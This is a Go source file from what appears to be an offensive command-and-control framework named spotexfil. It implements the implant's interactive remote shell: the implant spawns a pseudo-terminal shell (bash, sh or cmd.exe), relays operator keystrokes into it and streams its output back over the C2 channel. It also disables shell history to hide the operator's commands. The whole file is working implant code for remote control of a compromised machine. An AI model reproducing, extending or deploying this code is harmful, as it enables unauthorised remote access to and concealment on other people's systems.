package c2

import (
	"os"
	"os/exec"
	"runtime"
	"sync"
	"sync/atomic"

	"github.com/creack/pty"
	"github.com/sourcefrenchy/spotexfil/internal/protocol"
)

const (
	// ptyResultSeqBase offsets implant-originated pty result seqs far
	// above operator command seqs (mirrors tunnelResultSeqBase).
	ptyResultSeqBase = 950000
	// ptyReadChunk caps bytes per data frame so the marshaled result
	// stays well under the transport's message size limit.
	ptyReadChunk = 380
)

// ptyImplantSession is one live pseudo-terminal on the implant: the
// pty master file plus the shell process attached to it.
type ptyImplantSession struct {
	file *os.File
	cmd  *exec.Cmd
}

// ptyManager tracks an implant's single PTY session. One session per
// implant; a new open replaces any existing session.
type ptyManager struct {
	mu      sync.Mutex
	sess    *ptyImplantSession
	sendSeq int // next seq for implant -> operator data frames
	recvSeq int // next expected seq for operator -> implant data frames
}

// Implant structs cannot gain fields without editing implant.go, so
// pty managers live in a package-level registry keyed by implant
// (same pattern as the tunnel manager).
var (
	ptyManagersMu sync.Mutex
	ptyManagers   = make(map[*Implant]*ptyManager)
	ptyResultSeq  atomic.Int64
)

func init() {
	ptyResultSeq.Store(ptyResultSeqBase)
}

func (imp *Implant) getPtyManager() *ptyManager {
	ptyManagersMu.Lock()
	defer ptyManagersMu.Unlock()
	pm, ok := ptyManagers[imp]
	if !ok {
		pm = &ptyManager{}
		ptyManagers[imp] = pm
	}
	return pm
}

// nextPtyResultSeq returns a unique seq for implant-originated pty
// results (offset far above operator command seqs).
func nextPtyResultSeq() int {
	return int(ptyResultSeq.Add(1))
}

// sendPtyFrame queues a pty frame as a C2 result. Note: open-fail
// frames carry the error text in Data as PLAIN TEXT (not base64) so
// the operator can surface it directly; all data frames are base64.
func (imp *Implant) sendPtyFrame(f PtyFrame, status string) {
	if status == "" {
		status = "ok"
	}
	result := protocol.NewC2Message("pty", nextPtyResultSeq())
	result.Status = status
	result.Data = f.Marshal()
	result.SessionID = imp.sessionID
	imp.resultCh <- result
}

// handlePtyFrame processes a module=="pty" command from the operator.
// The orchestrator dispatches these here (like tunnel frames).
func (imp *Implant) handlePtyFrame(msg *protocol.C2Message) {
	f := ptyFrameFromArgs(msg.Args)
	pm := imp.getPtyManager()
	switch f.Op {
	case PtyOpOpen:
		pm.open(imp, f)
	case PtyOpData:
		pm.handleData(f)
	case PtyOpResize:
		pm.handleResize(f)
	case PtyOpClose:
		pm.close(nil)
	}
}

// open starts a new pty session, replacing any existing one (replace
// semantics: friendlier for operator reconnects after a dropped C2
// channel, since no explicit close may have arrived).
func (pm *ptyManager) open(imp *Implant, f PtyFrame) {
	pm.close(nil) // kill previous session, if any

	cols, rows := f.Cols, f.Rows
	if cols <= 0 {
		cols = 80
	}
	if rows <= 0 {
		rows = 24
	}

	cmd := exec.Command(ptyShell())
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"HISTFILE=/dev/null",
		"HISTSIZE=0",
	)
	file, err := pty.StartWithSize(cmd, &pty.Winsize{
		Cols: uint16(cols),
		Rows: uint16(rows),
	})
	if err != nil {
		// open-fail Data is the raw error string (NOT base64).
		imp.sendPtyFrame(PtyFrame{Op: PtyOpOpenFail, Data: err.Error()}, "error")
		return
	}

	sess := &ptyImplantSession{file: file, cmd: cmd}
	pm.mu.Lock()
	pm.sess = sess
	pm.sendSeq = 0
	pm.recvSeq = 0
	pm.mu.Unlock()

	imp.sendPtyFrame(PtyFrame{Op: PtyOpOpenOK, Cols: cols, Rows: rows}, "ok")
	go pm.readerLoop(imp, sess)
}

// ptyShell picks the shell to run in the pty: $SHELL on unix,
// falling back to /bin/bash then /bin/sh; cmd.exe on windows.
func ptyShell() string {
	if runtime.GOOS == "windows" {
		return "cmd.exe"
	}
	if sh := os.Getenv("SHELL"); sh != "" {
		if _, err := os.Stat(sh); err == nil {
			return sh
		}
	}
	if _, err := os.Stat("/bin/bash"); err == nil {
		return "/bin/bash"
	}
	return "/bin/sh"
}

// readerLoop streams pty output to the operator as sequenced data
// frames, then a close frame on EOF/error.
func (pm *ptyManager) readerLoop(imp *Implant, sess *ptyImplantSession) {
	buf := make([]byte, ptyReadChunk)
	for {
		n, err := sess.file.Read(buf)
		if n > 0 {
			pm.mu.Lock()
			seq := pm.sendSeq
			pm.sendSeq++
			pm.mu.Unlock()
			imp.sendPtyFrame(PtyFrame{
				Op:   PtyOpData,
				Seq:  seq,
				Data: EncodePtyData(buf[:n]),
			}, "ok")
		}
		if err != nil {
			// Only report the close if this session is still the
			// current one; a replaced session's death is expected.
			if pm.current() == sess {
				imp.sendPtyFrame(PtyFrame{Op: PtyOpClose}, "ok")
			}
			pm.close(sess)
			return
		}
	}
}

// handleData writes operator keystrokes to the pty. Frames arrive via
// sequential C2 messages paced by the operator writer, so arrival
// order is effectively the send order; recvSeq drops replayed or
// duplicate frames (Seq < expected) and applies the rest as they
// arrive.
func (pm *ptyManager) handleData(f PtyFrame) {
	pm.mu.Lock()
	sess := pm.sess
	if sess == nil || f.Seq < pm.recvSeq {
		pm.mu.Unlock()
		return // no session, or stale/duplicate frame
	}
	pm.recvSeq = f.Seq + 1
	pm.mu.Unlock()

	payload, err := DecodePtyData(f.Data)
	if err != nil {
		return
	}
	_, _ = sess.file.Write(payload)
}

// handleResize applies a window size change to the live pty.
func (pm *ptyManager) handleResize(f PtyFrame) {
	pm.mu.Lock()
	sess := pm.sess
	pm.mu.Unlock()
	if sess == nil {
		return
	}
	cols, rows := f.Cols, f.Rows
	if cols <= 0 {
		cols = 80
	}
	if rows <= 0 {
		rows = 24
	}
	_ = pty.Setsize(sess.file, &pty.Winsize{
		Cols: uint16(cols),
		Rows: uint16(rows),
	})
}

// current returns the live session, or nil.
func (pm *ptyManager) current() *ptyImplantSession {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	return pm.sess
}

// close tears down the session. Idempotent and mutex-guarded: if
// victim is non-nil only that session is torn down (a stale reader
// goroutine must not kill a newer replacement session); if victim is
// nil the current session (whatever it is) is torn down.
func (pm *ptyManager) close(victim *ptyImplantSession) {
	pm.mu.Lock()
	sess := pm.sess
	if sess == nil || (victim != nil && sess != victim) {
		pm.mu.Unlock()
		return
	}
	pm.sess = nil
	pm.mu.Unlock()

	if sess.cmd != nil && sess.cmd.Process != nil {
		_ = sess.cmd.Process.Kill() // pty close also SIGHUPs the shell
	}
	if sess.file != nil {
		_ = sess.file.Close()
	}
}

// sessionAlive reports whether a session exists (tests).
func (pm *ptyManager) sessionAlive() bool {
	return pm.current() != nil
}
